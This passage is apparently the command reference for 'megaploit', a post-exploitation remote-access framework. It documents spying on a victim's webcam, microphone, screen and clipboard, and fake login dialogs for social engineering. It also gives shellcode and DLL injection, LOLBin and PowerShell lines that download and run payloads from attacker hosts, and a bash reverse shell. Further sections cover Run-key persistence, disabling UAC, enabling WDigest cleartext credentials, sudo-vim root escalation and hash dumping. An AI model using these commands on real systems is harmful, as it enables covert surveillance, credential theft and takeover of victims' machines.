megaploit session(1) » webcam on
[+] Webcam started — http://10.0.0.42:5001
megaploit session(1) » webcam off
```

#### `screenrecord <secs> [fps] [width]` — MP4 recording

```
megaploit session(1) » screenrecord 30
megaploit session(1) » screenrecord 60 24 1920
# Saves as screenrec.mp4 in loot
```

#### `record <secs>` — Microphone recording

```
megaploit session(1) » record 60
[+] Recording saved: loot/.../recordings/20240115_143500.wav
```

#### `mic_level` — Check if someone is speaking

```
megaploit session(1) » mic_level
[+] Microphone level: -32 dB (quiet)
```

---

### GUI Interaction

#### `msgbox <title> <message>` — Dialog box

```
megaploit session(1) » msgbox "Windows Security" "Your session has expired. Please log in again."
# Pops a dialog box on victim's desktop — for social engineering
```

#### `notify <title> <message>` — OS notification

```
megaploit session(1) » notify "Software Update" "Restart required to apply critical updates."
```

#### `mouse_move <x> <y> [click]` — Move mouse

```
megaploit session(1) » mouse_move 960 540
megaploit session(1) » mouse_move 960 540 click
```

#### `type_keys text <text>` — Type text

```
megaploit session(1) » type_keys text "hello from attacker"
megaploit session(1) » type_keys text "net user backdoor P@ss /add"
```

#### `type_keys hotkey <key> [key2...]` — Fire hotkey

```
megaploit session(1) » type_keys hotkey win r          # open Run dialog
megaploit session(1) » type_keys hotkey ctrl c          # copy
megaploit session(1) » type_keys hotkey ctrl alt del    # task manager
```

#### `open_url <url>` — Open in browser

```
megaploit session(1) » open_url https://attacker-phishing.com/login
```

#### `play_sound <file>` — Play audio

```
megaploit session(1) » play_sound C:\Windows\Media\tada.wav
```

#### `set_wallpaper <file>` — Change wallpaper

```
megaploit session(1) » set_wallpaper C:\Users\user\Pictures\photo.jpg
```

#### `lock_screen` — Lock workstation

```
megaploit session(1) » lock_screen
```

#### `idle_time` — Time since last input

```
megaploit session(1) » idle_time
[+] User idle for 847 seconds
```

---

### Clipboard

#### `getclip` — Read clipboard

```
megaploit session(1) » getclip
[+] Clipboard: P@ssw0rd123!   ← user just copied a password
```

#### `setclip <text>` — Overwrite clipboard (clipboard hijacking)

```
megaploit session(1) » setclip "https://attacker.com/fake-update.exe"
# Next time user pastes (e.g. into browser) they get attacker URL
```

#### `clip_watch <seconds>` — Monitor clipboard changes

```
megaploit session(1) » clip_watch 300
# Polls clipboard every 2 seconds for 5 minutes
# Captures every password, address, etc. that gets copied
```

---

### Code Injection

#### `inject_shellcode <pid> <hex>` — Shellcode injection

```
megaploit session(1) » inject_shellcode 1234 fc4883e4f0e8cc000000...
# Injects shellcode via WriteProcessMemory + CreateRemoteThread
```

#### `dll_inject <pid> <dll_path>` — DLL injection

```
megaploit session(1) » dll_inject 1234 C:\Windows\Temp\evil.dll
# Uses LoadLibraryA via CreateRemoteThread
```

#### `living_off_land <lolbin> <args>` — LOLBin execution

```
megaploit session(1) » living_off_land mshta http://attacker.com/payload.hta
megaploit session(1) » living_off_land certutil -urlcache -f http://a.b.c/a.exe a.exe
megaploit session(1) » living_off_land rundll32 shell32.dll,Control_RunDLL C:\Temp\evil.cpl
megaploit session(1) » living_off_land regsvr32 /s /u /i:http://a.b.c/a.sct scrobj.dll
megaploit session(1) » living_off_land wmic process call create "calc.exe"
```

#### `execute <exe> [args]` — Direct binary execution

```
megaploit session(1) » execute C:\Windows\System32\net.exe user /domain
megaploit session(1) » execute C:\Windows\System32\nltest.exe /domain_trusts
megaploit session(1) » execute /bin/sh -c "id; uname -a"
# No shell expansion — direct argv
```

---

### Windows Registry

Full read/write/delete access. See [Registry section in README](../README.md#windows-registry).

#### `reg query <HIVE\\key>` — List values and subkeys

```
megaploit session(1) » reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
megaploit session(1) » reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
megaploit session(1) » reg query HKLM\SYSTEM\CurrentControlSet\Services
```

#### `reg get <HIVE\\key> <value>` — Read one value

```
megaploit session(1) » reg get HKCU\Software\Microsoft\Windows\CurrentVersion\Run MyApp
megaploit session(1) » reg get HKLM\SYSTEM\CurrentControlSet\Control\Lsa LimitBlankPasswordUse
megaploit session(1) » reg get HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion CurrentVersion
```

#### `reg set <HIVE\\key> <value> <type> <data>` — Write a value

```
# Add Run key persistence
megaploit session(1) » reg set HKCU\Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ "C:\AppData\agent.exe"

# Enable WDigest cleartext
megaploit session(1) » reg set HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest UseLogonCredential REG_DWORD 1

# Disable UAC
megaploit session(1) » reg set HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System EnableLUA REG_DWORD 0
```

**Types:** `REG_SZ`, `REG_DWORD`, `REG_QWORD`, `REG_BINARY`, `REG_EXPAND_SZ`, `REG_MULTI_SZ`

#### `reg delete <HIVE\\key> [value]` — Delete

```
# Delete a value
megaploit session(1) » reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run Updater

# Delete a whole key (and all its values)
megaploit session(1) » reg delete HKCU\Software\EvilApp
```

---

### Desktop & Window Station

#### `getdesktop` — Current desktop name

```
megaploit session(1) » getdesktop
[+] Current desktop: Default (WinSta0\Default)
```

#### `enumdesktops` — List all desktops

```
megaploit session(1) » enumdesktops
[+] Desktops in WinSta0: Default, Winlogon, Screen-saver
```

---

### Background Jobs (In-Session)

Run long-running commands without blocking the console.

#### `run_bg <command>` — Start a background job

```
megaploit session(1) » run_bg find / -name "*.pem" 2>/dev/null
[+] Job started: job_abc123

megaploit session(1) » run_bg nmap -sV 10.10.10.0/24
[+] Job started: job_def456
```

#### `job_result <job_id>` — Get output

```
megaploit session(1) » job_result job_abc123
/etc/ssl/certs/ca-certificates.pem
/home/user/.ssh/id_rsa.pem
```

Check the global job list:

```
megaploit [1] » jobs list
  ID         NAME              STATUS     STARTED
  abc123     find *.pem        complete   2024-01-15 14:30:22
```

---

### Advanced Shell (Meterpreter-class)

These commands are available in both the session context and the `MeterpreterSession` (`use <id>`) context.

#### `interactive` — Real PTY shell

```
megaploit (10.0.0.42) > interactive
  [*] PTY ready — Ctrl-C to detach
$ whoami
jdoe
$ sudo -l
User jdoe may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
$ sudo vim -c ':!/bin/bash'
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### `migrate <pid>` — Process migration

```
megaploit (10.0.0.42) > ps
  4832  svchost.exe  NT AUTHORITY\SYSTEM

megaploit (10.0.0.42) > migrate 4832
[+] Migrated to PID 4832 via PyRun_SimpleString remote thread
```

#### `port_scan <host> <ports>` — TCP scan from target

```
megaploit (10.0.0.42) > port_scan 10.10.10.20 22,80,443,3389
megaploit (10.0.0.42) > port_scan 10.10.10.20 1-1024
megaploit (10.0.0.42) > port_scan 10.10.10.0/24 443
```

#### `run_psh <cmd>` — PowerShell one-liner

```
megaploit (10.0.0.42) > run_psh "Get-LocalUser | Select Name,Enabled"
megaploit (10.0.0.42) > run_psh "Get-ADUser -Filter * | Select Name,SamAccountName"
megaploit (10.0.0.42) > run_psh "Get-Process | Sort CPU -Desc | Select -First 10"
megaploit (10.0.0.42) > run_psh "(New-Object Net.WebClient).DownloadString('http://10.0.0.1/s.ps1') | IEX"
```

#### `run_python <code>` — Python in agent interpreter

```
megaploit (10.0.0.42) > run_python import os; print(os.getcwd())
megaploit (10.0.0.42) > run_python import socket; print(socket.gethostbyname('dc.corp'))
megaploit (10.0.0.42) > run_python open('/tmp/bd','w').write('#!/bin/bash\nbash -i>&/dev/tcp/10.0.0.1/5555 0>&1')
```

#### `memory_read <pid> <addr> <size>` — Read process memory

```
megaploit (10.0.0.42) > memory_read 1234 0x7fff0000 128
megaploit (10.0.0.42) > memory_read 4 0x400000 256
```

#### `memory_write <pid> <addr> <b64>` — Write process memory

```
megaploit (10.0.0.42) > memory_write 1234 0x7fff0000 SGVsbG8gV29ybGQ=
```

#### `beacon_sleep <secs>` — Adjust reconnect interval

```
megaploit (10.0.0.42) > beacon_sleep 60    # agent checks back every 60s
megaploit (10.0.0.42) > beacon_sleep 5     # fast mode (noisy, but responsive)
```

---

### Python REPL on Agent (`irb`)

Drop into an interactive Python interpreter running inside the agent process:

```
megaploit session(1) » irb

>>> import os
>>> os.listdir('/etc')
['passwd', 'shadow', 'hosts', 'hostname', ...]

>>> import subprocess
>>> subprocess.check_output(['id'], text=True)
'uid=0(root) gid=0(root) groups=0(root)\n'

>>> # Multi-line block — submit with blank line:
>>> for user in open('/etc/passwd').readlines():
...     if '/bin/bash' in user:
...         print(user.strip())
...
root:x:0:0:root:/root:/bin/bash
jdoe:x:1000:1000::/home/jdoe:/bin/bash

>>>               ← blank line executes the block

>>> exit
```

---

### Runtime Extensions

Extend the agent's capabilities at runtime without redeployment.

#### `load_ext <local.py>` — Upload and load in one step

```
# Write a custom extension on your machine:
cat > /tmp/my_ext.py << 'EOF'
def _dump_clipboard(conn, args):
    import subprocess
    return subprocess.check_output(["pbpaste"], text=True)

HANDLERS = {"dump_clipboard": _dump_clipboard}
EOF

# Upload and register in one command:
megaploit session(1) » load_ext /tmp/my_ext.py
[+] Extension 'my_ext' loaded — verbs: dump_clipboard

# Now use the new command:
megaploit session(1) » dump_clipboard
Hello from victim's clipboard!
```

#### `load_extension <path>` — Load by path or module already on target

```
megaploit session(1) » load_extension /tmp/my_ext.py
megaploit session(1) » load_extension megaploit.agent.meterp
```

#### `unload_extension <name>` — Remove extension

```
megaploit session(1) » unload_extension my_ext
[+] Extension 'my_ext' unloaded — verbs deregistered: dump_clipboard
```

#### `list_extensions` — Show loaded extensions

```
megaploit session(1) » list_extensions
  Extension   Verbs
  my_ext      dump_clipboard, steal_tokens
  meterp      migrate, port_scan, run_psh, run_python, ...
```

---

### Post Module Runner (In-Session)

Run any registered post module against the current session:

```
megaploit session(1) » run post/multi/gather/sysinfo
megaploit session(1) » run post/linux/gather/dump_shadow
megaploit session(1) » run post/windows/gather/hashdump
```

List available post modules:

```
megaploit [0] » show modules post
```

---

### Toolbox (In-Session)

Run installed tools against the current session's IP:

#### `toolbox_run <name> [args]` — Run locally, target = session IP

```
megaploit session(1) » toolbox_run linpeas
megaploit session(1) » toolbox_run nmap -sV -p 1-1024
```

#### `toolbox_deploy <name> [args]` — Upload and run on target

```
megaploit session(1) » toolbox_deploy linpeas
```

---

## Module Context Options Reference

When a module is active, options appear in a table:

```
  Option    Type     Value         Req  Description
  ──────────────────────────────────────────────────────────────
  RHOSTS    string   (not set)     yes  Target IP or CIDR
  RPORT     integer  80            no   Target port
  LHOST     address  (not set)     yes  Callback IP
  THREADS   integer  100           no   Concurrent threads
  TIMEOUT   integer  2             no   Connect timeout (seconds)
  VERBOSE   boolean  False         no   Print all results
```

**Option types:**

| Type | Accepted values |
|---|---|
| `string` | Any text |
| `integer` | Whole number |
| `boolean` | `true` / `false` / `1` / `0` |
| `address` | IPv4 or hostname |
| `cidr` | CIDR notation like `10.0.0.0/24` |
| `port` | Number 1–65535 |
| `enum` | One of a predefined list |

---

## Tab Completion Reference

`Tab` completes at any prompt:

| Context | What completes |
|---|---|
| Global prompt | All global commands |
| `use <Tab>` | All module paths |
| Session prompt | All 135 session commands |
| `toolbox_run <Tab>` | Installed tool names |
| Any prompt | Plugin command names |

Arrow keys (↑/↓) navigate command history. History is persisted between sessions in `~/.megaploit_history.json`.
